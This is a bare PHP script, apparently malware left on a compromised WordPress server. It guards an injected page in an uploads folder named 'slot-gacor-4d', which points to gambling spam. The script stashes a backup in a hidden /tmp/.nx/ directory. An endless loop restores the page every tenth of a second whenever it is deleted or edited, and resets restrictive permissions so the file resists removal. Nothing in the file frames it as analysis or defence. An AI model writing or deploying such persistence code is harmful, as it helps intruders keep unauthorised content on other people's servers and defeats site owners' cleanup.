<?php

$path = "/usr/local/www/arsip/wp-content/uploads/slot-gacor-4d";
$shell_name = "index.html";
$gabung = $path . "/" . $shell_name;
$khusus_path = $path . "/";
$backname = explode('.', $shell_name)[0] . ".txt";
$raw = file_get_contents($gabung);

if (file_exists('/tmp/.nx/')) {
    file_put_contents('/tmp/.nx/'.$backname, $raw);
} else {
    mkdir('/tmp/.nx/', 0777, true);
    file_put_contents('/tmp/.nx/'.$backname, $raw);
}

while (true) {

    $backupname = file_get_contents('/tmp/.nx/'.$backname, true);
    $raw2 = file_get_contents($gabung);

    if (!file_exists('/tmp/.nx/')) {
        mkdir('/tmp/.nx/', 0777);
        file_put_contents('/tmp/.nx/'.$backname, $raw);
    } else {
        null;
    }
    
    if (!file_exists($gabung)) {
        file_put_contents($gabung, $backupname);
        chmod($gabung, 2555);
    } else {
        null;
    }

    if (!file_exists($khusus_path)) {
        mkdir($khusus_path, 0755);
        file_put_contents($gabung, $backupname);
    } else {
        null;
    }
    
    $permission = substr(sprintf('%o', fileperms($gabung)), -4);
    if ($permission != "2555" && $permission != "4111") {
        chmod($gabung, 2555);
    } else {
        null;
    }

    if ($backupname != $raw) {
        file_put_contents('/tmp/.nx/'.$backname, $raw2);
    } else {
        null;
    }

    if ($raw2 != $backupname) {
        chmod($gabung, 0755);
        file_put_contents($gabung, $backupname);
        chmod($gabung, 2555);
    } else {
        null;
    }

    if (!file_exists('/tmp/.nx/'.$backname)) {
        file_put_contents('/tmp/.nx/'.$backname, $raw2);
    } else {
        null;
    }    
    usleep(100000);

}

?>
